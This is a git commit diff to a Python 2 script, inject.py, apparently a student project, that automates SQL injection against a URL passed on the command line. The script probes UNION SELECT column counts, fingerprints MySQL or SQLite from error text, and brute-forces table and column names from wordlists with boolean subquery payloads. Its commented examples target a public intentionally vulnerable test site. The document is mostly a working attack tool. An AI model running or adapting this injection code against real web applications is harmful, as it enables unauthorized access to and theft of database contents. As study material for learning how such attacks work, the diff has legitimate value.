8fd7321932435b9b69fac79b48fb0f153d96a037
kselladu@asu.edu <kselladu@asu.edu>
2017-04-30 02:52:17 -0700

    SQL injection code reformat

--- SQL_Injection/inject.py
+++ SQL_Injection/inject.py
@@ -3,14 +3,13 @@ import re
 import sys
 import logging
 
+
 FORMAT = "[%(levelname)s:%(asctime)s:%(funcName)s()] %(message)s"
 logging.basicConfig(format=FORMAT, level=logging.DEBUG)
 
 # url="http://testphp.vulnweb.com/listproducts.php?cat=2"
 # url="http://testphp.vulnweb.com/listproducts.php?cat=2%20union%20select%20null,null,null,null,null,null,null,null,null,null%20from%20information_schema.columns"
-url = sys.argv[1]
-table_data = "keywords/common-tables.txt"
-column_data = "keywords/common-columns.txt"
+
 
 #if sys.argv[2] is not None:
 #    table_data = sys.argv[2]
@@ -25,19 +24,19 @@ column_data = "keywords/common-columns.txt"
 ##Function to find the number of columns used in url page using UNION query
 
 def run_union_query(url, dbname):
-    logging.info(url)
     regex = re.compile('Error|SELECT statement', re.IGNORECASE)
     # print the_page
     null_holder = "null,"
     sql = ""
     if dbname == "mysql":
-        sql = "union select {0} from information_schema.columns"
+        sql = "union%20select%20{0}%20from%20information_schema.columns"
     elif dbname == "sqlite":
-        sql = "union select {0} from SQLITE_MASTER"
+        sql = "union%20select%20{0}%20from%20SQLITE_MASTER"
     null_holder_count = 1
+    logging.info(url + "%20" +sql)
     url_withsql=""
     while True:
-        url_withsql = url + " " + sql.format((null_holder * null_holder_count)[:-1])
+        url_withsql = url + "%20" + sql.format((null_holder * null_holder_count)[:-1])
         # null_holder+=","
         #print url_withsql
         req = urllib2.Request(url_withsql)
@@ -45,6 +44,9 @@ def run_union_query(url, dbname):
         the_page = response.read()
         # print the_page
         # print regex.search(the_page)
+        if null_holder_count==50:
+            logging.info("Union URL can't be done!")
+            exit(0)
         if regex.search(the_page) is None:
             break
         null_holder_count += 1
@@ -57,16 +59,17 @@ def run_union_query(url, dbname):
 def run_table_query(url):
     logging.info("Inside run table query")
     regex = re.compile('Error|Table doesn\'t exist', re.IGNORECASE)
-    sql = "and (SELECT 1 from {0})=1"
+    sql = "and%20(SELECT%201%20from%20{0})=1"
     file = open(table_data, "r")
     table_name = ""
     result = []
     count=1
+    logging.info(url + "%20" + sql)
     for line in file:
-        if count==100:
-            break
+        #if count==200:
+        #    break
         count+=1
-        url_withsql = url + " " + sql.format(line.replace("\n", ""))
+        url_withsql = url + "%20" + sql.format(line.replace("\n", ""))
         # null_holder+=","
         #print url_withsql
         req = urllib2.Request(url_withsql)
@@ -84,16 +87,17 @@ def run_table_query(url):
 def run_column_query(url, table):
     logging.info("Inside run column query")
     regex = re.compile('Error|Unknown column', re.IGNORECASE)
-    sql = "and (SELECT substring(concat(1,{0}),1,1) from " + table + " limit 0,1)=1"
+    sql = "and%20(SELECT%20substring(concat(1,{0}),1,1)%20from%20" + table + "%20limit%200,1)=1"
     file = open(column_data, "r")
     table_name = ""
     result = []
     count=1
+    logging.info(url + "%20" + sql)
     for line in file:
-        if count==200:
-            break
+        #if count==200:
+        #    break
         count+=1
-        url_withsql = url + " " + sql.format(line.replace("\n", ""))
+        url_withsql = url + "%20" + sql.format(line.replace("\n", ""))
         # null_holder+=","
         # print url_withsql
         req = urllib2.Request(url_withsql)
@@ -110,11 +114,11 @@ def run_column_query(url, table):
 
 def find_db(url):
 
-    sql = "and SELECT"
-    regex_mysql = re.compile('mysql', re.IGNORECASE)
-    regex_sqlite = re.compile('sqlite', re.IGNORECASE)
-    req = urllib2.Request(url + " " + sql) #http request
-    #print url + " " + sql
+    sql = "and%20SELECT"
+    regex_mysql = re.compile('mysql.*', re.IGNORECASE)
+    regex_sqlite = re.compile('sqlite.*', re.IGNORECASE)
+    logging.info(url + "%20" + sql)
+    req = urllib2.Request(url + "%20" + sql) #http request
     response = urllib2.urlopen(req)
     the_page = response.read()
     if regex_mysql.search(the_page) is not None:
@@ -171,7 +175,29 @@ def sql_injection(url):
     pass
 
 
-sql_injection(url)
-# run_union_query(url)
-# run_table_query(url)
-# run_column_query(url,"users")
+if __name__ == "__main__":
+
+    if len(sys.argv) < 2:
+        print "Pass URL as command line argument and pass Table and Column dataset \n" \
+              "file name as argument if it should be overrided! \n" \
+              "Arg 2 should be table filename  \n" \
+              "Arg 3 should be column filename"
+        exit(0)
+    url = sys.argv[1]
+    table_data = "keywords/tables.txt"
+    column_data = "keywords/columns.txt"
+    if len(sys.argv) >= 4:
+        table_data = sys.argv[2]
+        column_data = sys.argv[3]
+    #print table_data
+    #print column_data
+    sql_injection(url)
+    # run_union_query(url)
+    # run_table_query(url)
+    #run_column_query(url,"news")
+
+
+
+#Reference
+#http://www.kalitutorials.net/2015/02/blind-sql-injection.html
+#https://github.com/sqlmapproject/sqlmap
